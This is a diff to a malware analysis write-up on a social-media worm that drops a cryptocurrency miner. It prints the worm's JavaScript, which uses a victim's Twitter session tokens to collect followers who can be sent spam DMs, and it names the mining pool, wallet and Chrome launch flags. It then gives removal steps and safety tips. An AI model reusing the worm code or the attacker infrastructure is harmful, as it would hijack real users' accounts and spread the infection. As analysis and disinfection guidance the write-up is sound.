@@ -1059,7 +1059,7 @@ var ufrkhn = function(){
 ```
 <br> And then, open Javascript console, type `ufrkhn();` and you get:
 ![Console](https://user-images.githubusercontent.com/68118236/145717743-638bca3c-47d5-4868-8964-aad551ce826a.png)
-Clicking to that `blob` URL, you will get:
+<br>Clicking to that `blob` URL, you will get:
 ```javascript
 var config = {};
 config.url = new URL("https://pube.me");
@@ -1411,6 +1411,52 @@ facebook.translate = function (vars) {
   })
 }
 ```
+<br> The first code create a shortened link in the form of `https://is.gd/some_id_here` from the Google Storage API link.
+<br> The second one translate the text `Hi See your profile visitors with ProfileVisitors` with Google Translator API and then post it to Facebook.
+<br> For Twitter, they do the same thing except that they show the picture of your followers:
+```javascript
+twitter.getFollowers = function () {
+  var params = {
+    variables: JSON.stringify({
+      "userId": twitter.twid,
+      "count": 1000,
+      "withTweetQuoteCount": false,
+      "includePromotedContent": false,
+      "withSuperFollowsUserFields": true,
+      "withUserResults": true,
+      "withBirdwatchPivots": false,
+      "withDownvotePerspective": false,
+      "withReactionsMetadata": false,
+      "withReactionsPerspective": false,
+      "withSuperFollowsTweetFields": true
+    })
+  }
+
+  fetch('https://twitter.com/i/api/graphql/XGZdhJo6WrrwE2AKkgFIew/Followers?' + deSerialize(params), {
+    headers: {
+      "authorization": "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA",
+      "x-csrf-token": twitter.csrf
+    }
+  }).then(r => r.json()).then(data => {
+    var entries = data.data.user.result.timeline.timeline.instructions.find(i => i.type == 'TimelineAddEntries')?.entries;
+    twitter.followers = [];
+    entries.forEach(entry => {
+      if(twitter.followers.length >= twitter.config.message_limit) return;
+      if(!entry.entryId.startsWith('user')) return;
+      var user = entry.content.itemContent.user_results.result;
+      if(!user.legacy.can_dm) return;
+      if(localStorage[`twitter.dm.${user.rest_id}.${twitter.config.cookie_name}`]) return;
+      twitter.followers.push(user);
+    })
+
+    console.log(twitter.followers);
+
+    if(twitter.followers.length > 0) {
+      twitter.getLink();
+    }
+  })
+}
+```
 
 ### 9) The miner
 In the function `zlmsyuslmwzh` in the fb.clean.au3 file:
@@ -1516,8 +1562,44 @@ EndFunc
 <br> It connect to the pool at address `pool.okim.me:3333` with the username of `82mnaBkHb15Mq5iGxxfVL9aJBwaBcvpveGojJitDJamddnZi8dPJVAL8ti1iy1rYfwY4RmDRofkqyN8tZfq2UuhHCaxWkYp` and the password `Worker`. I have checked and the server still work!
 <br> When mining, if you open the Task Manager, you will see it shows at `Windows Controller`.
 
+## How to fix it?
+<br> If you got this, then don't worry, you can remove it completely from your system!
+- First, get your username. If you didn't know, open Command Prompt and then then type in `whoami`. Then it will output something in the form of `YOURCOMPUTERNAME\YOURUSERNAME`. For example `laptop\admin`. Your username is `admin`.
+- Then, browse to `C:\Users\YOURUSERNAME\AppData\Roaming\YOURUSERNAME\`. If you install Windows to somewhere else other than `C:`, you will need to search in that drive! Or shorter, use <kbd>Windows</kbd> + <kbd>R</kbd> and then type in `%AppData%\..\Roaming\%username%`.
+- After that you need to change the folder's security setting. Right click on the folder, choose `Properties`, then go to `Security` tab. Click on `Advanced`
+![Security tab](https://user-images.githubusercontent.com/68118236/146683639-5e56a32c-514a-45cf-b680-47e6a13b285f.png)
+- After that, it will open:
+![Advanced](https://user-images.githubusercontent.com/68118236/146683727-f5ff84f2-b69c-438b-854b-aad512064215.png)
+- Click on `Change` then change the owner of the folder to your username!
+![image](https://user-images.githubusercontent.com/68118236/146683795-27a518eb-0904-4a0f-ad70-671fa71b1208.png)
+- Click on `Find now`, choose your username and then click `OK`
+![image](https://user-images.githubusercontent.com/68118236/146683841-106e07cc-678e-4b77-94b4-181560414082.png)
+- Click on the tickbox and then click `OK`, and then `OK` again in the `Security` tab:
+![image](https://user-images.githubusercontent.com/68118236/146683876-0e06fc44-2325-4c6f-87a1-05484ca8afdf.png)
+- Reopen `Properties`, then choose `Security` again, click on `Edit`:
+![image](https://user-images.githubusercontent.com/68118236/146683957-9095f0d9-25cc-4571-be38-2521223200eb.png)
+- Click on your username, choose `Full control` and then click `OK` and then `OK` again:
+![image](https://user-images.githubusercontent.com/68118236/146684032-dec80077-6740-4dc5-9aed-0923fbf95995.png)
+- Open Task Manager, check if any program named `Windows Controller`, then kill it.
+- After that, reopen the folder and delete the whole folder.
+- That's done.
+- If you want to remove the infected shortcut, you can click `Properties` on your Chrome / Chromium shortcut on the Desktop and then remove the command line `--enable-automation --restore-last-session --disable-blink-features=AutomationControlled --load-extension=` and the rest. Click `OK` and you are done!
+
+## What we can learn from:
+- Be careful when clicking links on Internet and on Facebook. Always check with VM or sandbox. I recommend virustotal.com, urlscan.io and browserling.com
+- Always ask why an app require admin right
+- Scan everything (not sensitive) with virustotal.com
+- Avoid Self-XSS [find out more on Facebook help](https://www.facebook.com/help/246962205475854)
+
 ## Notes
 - The server is nearly not accessable, mostly got 403, 404 and 1020 error code
 - Two domains `pube.me`, `okim.me` are all use Cloudflare protection.
 - Some parts of the world only get 403.
 - <b>This project is made for educational purpose, please don't reuse the code for any purpose other than education. I have ABSOLUTELY NO responsibilities for ANY KIND OF DAMAGE MADE BY USING ANY OF THE CONTENT IN THIS PROJECT.</b>
+
+## Hashes of the files
+https://www.vmray.com/analyses/89516baa335e/report/ioc.html
+
+## Similar post
+https://sec.vnpt.vn/2019/05/ma-doc-coinminer-tren-facebook/
+<br> I think they are the same thing but different server :)
